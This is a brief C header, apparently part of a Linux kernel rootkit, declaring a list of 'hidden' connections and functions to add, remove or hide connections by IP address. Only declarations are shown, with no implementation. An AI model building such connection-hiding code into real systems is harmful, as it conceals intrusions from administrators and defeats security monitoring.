#include <linux/in.h>

struct hidden_conn {
	struct sockaddr_in addr;
	struct list_head list;
};

extern struct list_head hidden_conn_list;

void network_hide_add(struct sockaddr_in addr);
void network_hide_remove(struct sockaddr_in addr);
//void hide_conn(char *ip_str);